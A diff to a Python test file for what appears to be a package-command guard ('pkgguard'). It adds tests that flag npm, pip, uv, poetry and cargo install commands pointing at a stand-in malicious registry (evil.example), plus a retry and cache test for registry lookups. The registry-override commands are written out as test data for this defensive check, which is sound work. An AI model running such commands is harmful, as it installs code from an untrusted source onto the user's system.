@@ -1,4 +1,5 @@
 import json
+import io
 from pathlib import Path
 
 import pytest
@@ -218,16 +219,49 @@ def test_authorize_rejects_compound_or_embedded_shell(command):
 
 @pytest.mark.parametrize("command", [
     "npm install --registry=http://evil.example lodash",
-    "npm install --registry http://evil.example lodash",
+    "npm install --@foo:registry=http://evil.example @foo/bar",
     "pip install --index-url https://evil.example/simple requests",
     "pip install --extra-index-url https://evil.example/simple requests",
     "pip install --find-links https://evil.example/simple requests",
-    "pip install -i https://evil.example/simple requests",
+    "uv add requests --index https://evil.example",
+    "uv pip install requests --default-index https://evil.example",
+    "poetry add requests --source evil",
+    "cargo add serde --index https://evil.example",
 ])
 def test_authorize_rejects_registry_overrides(command):
     decision = authorize_command(command)
     assert decision.decision == "REVIEW"
     assert decision.safe_to_execute is False
+
+
+def test_unknown_package_manager_flags_fail_closed():
+    assert authorize_command("npm install express --@scope:registry=https://evil.example").safe_to_execute is False
+    assert authorize_command("cargo add serde --index https://evil.example").safe_to_execute is False
+
+
+def test_registry_json_retries_and_uses_short_cache(monkeypatch, tmp_path):
+    import pkgguard.registries as registries
+
+    monkeypatch.setenv("PKGGUARD_CACHE_DIR", str(tmp_path))
+    calls = {"count": 0}
+
+    class Response:
+        def __enter__(self):
+            return io.BytesIO(b'{"ok": true}')
+
+        def __exit__(self, *_):
+            return False
+
+    def fake_urlopen(*args, **kwargs):
+        calls["count"] += 1
+        if calls["count"] == 1:
+            raise OSError("temporary failure")
+        return Response()
+
+    monkeypatch.setattr(registries.urllib.request, "urlopen", fake_urlopen)
+    assert registries._get_json("https://registry.example/package") == {"ok": True}
+    assert registries._get_json("https://registry.example/package") == {"ok": True}
+    assert calls["count"] == 2
 
 
 def test_authorize_cli_fails_closed_for_review(monkeypatch, capsys):
